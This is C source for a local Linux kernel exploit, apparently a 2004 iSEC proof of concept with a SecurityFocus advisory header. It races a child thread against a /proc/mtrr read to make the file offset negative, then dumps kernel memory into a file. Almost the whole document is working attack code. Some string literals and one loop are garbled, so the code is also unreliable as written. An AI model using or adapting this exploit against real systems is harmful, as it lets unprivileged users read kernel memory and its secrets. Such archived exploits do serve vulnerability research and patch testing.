/*
source: http://www.securityfocus.com/bid/10201/info

A local integer handling vulnerability has been announced in the Linux kernel. It is reported that this vulnerability may be exploited by an unprivileged local user to obtain kernel memory contents. Additionally it is reported that a root user may exploit this issue to write to arbitrary regions of kernel memory, which may be a vulnerability in non-standard security enhanced systems where uid 0 does not have this privilege.

The vulnerability presents itself due to integer handling errors in the proc handler for cpufreq.
*/

/*
 *
 *  /proc ppos kernel memory read (semaphore method)
 *
 *  gcc -O3 proc_kmem_dump.c -o proc_kmem_dump
 *
 *  Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
 *
 *  THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 *  AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 *  WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 */


#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>

#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/mman.h>

#include <linux/unistd.h>

#include <asm/page.h>


//  define machine mem size in MB
#define MEMSIZE 64



_syscall5(int, _llseek, uint, fd, ulong, hi, ulong, lo, loff_t *, res,
          uint, wh);



void fatal(const char *msg)
{
    printf("0);
    if(!errno) {
        fprintf(stderr, "FATAL ERROR: %s0, msg);
    }
    else {
        perror(msg);
    }

    printf("0);
    fflush(stdout);
    fflush(stderr);
    exit(31337);
}


static int cpid, nc, fd, pfd, r=0, i=0, csize, fsize=1024*1024*MEMSIZE,
           size=PAGE_SIZE, us;
static volatile int go[2];
static loff_t off;
static char *buf=NULL, *file, child_stack[PAGE_SIZE];
static struct timeval tv1, tv2;
static struct stat st;


//  child close sempahore & sleep
int start_child(void *arg)
{
//  unlock parent & close semaphore
    go[0]=0;
    madvise(file, csize, MADV_DONTNEED);
    madvise(file, csize, MADV_SEQUENTIAL);
    gettimeofday(&tv1, NULL);
    read(pfd, buf, 0);

    go[0]=1;
    r = madvise(file, csize, MADV_WILLNEED);
    if(r)
        fatal("madvise");

//  parent blocked on mmap_sem? GOOD!
    if(go[1] == 1 || _llseek(pfd, 0, 0, &off, SEEK_CUR)<0 ) {
        r = _llseek(pfd, 0x7fffffff, 0xffffffff, &off, SEEK_SET);
            if( r == -1 )
                fatal("lseek");
        printf("0 Race won!"); fflush(stdout);
        go[0]=2;
    } else {
        printf("0 Race lost %d, use another file!0, go[1]);
        fflush(stdout);
        kill(getppid(), SIGTERM);
    }
    _exit(1);

return 0;
}

void usage(char *name)
{
    printf("0SAGE: %s <file not in cache>", name);
    printf("0);
    exit(1);
}


int main(int ac, char **av)
{
    if(ac<2)
        usage(av[0]);

//  mmap big file not in cache
    r=stat(av[1], &st);
    if(r)
        fatal("stat file");
    csize = (st.st_size + (PAGE_SIZE-1)) & ~(PAGE_SIZE-1);

    fd=open(av[1], O_RDONLY);
    if(fd<0)
        fatal("open file");
    file=mmap(NULL, csize, PROT_READ, MAP_SHARED, fd, 0);
    if(file==MAP_FAILED)
        fatal("mmap");
    close(fd);
    printf("0 mmaped uncached file at %p - %p", file, file+csize);
    fflush(stdout);

    pfd=open("/proc/mtrr", O_RDONLY);
    if(pfd<0)
        fatal("open");

    fd=open("kmem.dat", O_RDWR|O_CREAT|O_TRUNC, 0644);
    if(fd<0)
        fatal("open data");

    r=ftruncate(fd, fsize);
    if(r<0)
        fatal("ftruncate");

    buf=mmap(NULL, fsize, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if(buf==MAP_FAILED)
        fatal("mmap");
    close(fd);
    printf("0 mmaped kernel data file at %p", buf);
    fflush(stdout);

//  clone thread wait for child sleep
    nc = nice(0);
    cpid=clone(&start_child, child_stack + sizeof(child_stack)-4,
           CLONE_FILES|CLONE_VM, NULL);
    nice(19-nc);
    while(go[0]==0) {
        i++;
    }


//  try to read & sleep & move fpos to be negative
    gettimeofday(&tv1, NULL);
    go[1] = 1;
    r = read(pfd, buf, size );
    go[1] = 2;
    gettimeofday(&tv2, NULL);
    if(r<0)
        fatal("read");
    while(go[0]!=2) {
        i++;
    }

    us = tv2.tv_sec - tv1.tv_sec;
    us *= 1000000;
    us += (tv2.tv_usec - tv1.tv_usec) ;

    printf("0 READ %d bytes in %d usec", r, us); fflush(stdout);
    r = _llseek(pfd, 0, 0, &off, SEEK_CUR);
    if(r < 0 ) {
        printf("0 SUCCESS, lseek fails, reading kernel mem...0);
        fflush(stdout);
        i=0;
        for(;;) {
            r = read(pfd, buf, PAGE_SIZE );
            if(r!=PAGE_SIZE)
                break;
            buf += PAGE_SIZE;
            i++;        PAGE %6d", i); fflush(stdout);
            printf("
        }
        printf("0 done, err=%s", strerror(errno) );
        fflush(stdout);
    }
    close(pfd);

    printf("0);
    sleep(1);
    kill(cpid, 9);

return 0;
}